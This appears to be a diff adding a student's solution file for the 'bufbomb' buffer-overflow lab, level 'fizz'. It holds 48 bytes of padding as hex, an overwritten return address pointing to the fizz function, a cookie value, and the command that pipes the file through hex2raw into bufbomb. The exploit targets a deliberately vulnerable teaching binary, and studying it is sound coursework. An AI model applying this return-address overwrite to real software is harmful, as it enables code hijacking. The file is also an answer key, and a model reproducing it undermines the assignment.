@@ -1,0 +1,19 @@
+/* getbuf return address at address 0x55683314 */
+/* Local buffle start at address 0x556832e8 */
+/* 
+	instructions :
+		cat fizz_1190202128.txt |./hex2raw  | ./bufbomb -u 1190202128 
+
+*/
+/* Padding required : 44 bytes */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
+/* fizz address */
+eb 8b 04 08 
+
+/* Padding required : 4 bytes */
+00 00 00 00
+
+/* changed global value */
+dc 1d 17 4e
